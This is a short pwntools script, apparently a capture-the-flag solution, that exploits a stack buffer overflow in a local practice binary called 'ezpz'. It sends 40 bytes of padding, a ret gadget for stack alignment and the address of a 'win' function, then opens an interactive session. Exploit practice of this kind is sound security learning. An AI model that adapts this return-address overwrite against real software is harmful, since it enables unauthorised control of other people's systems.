from pwn import *

p = process('./ezpz')
elf = context.binary = ELF('./ezpz')

win = p64(0x0000000000401173)
#win = p64(elf.symbols["win"])
ret = p64(0x0000000000401016) 
#stack alignment

payload = b"a" * 40
payload += ret
payload += win

print(p.recvuntil(b":"))
p.sendline(payload)
p.interactive()
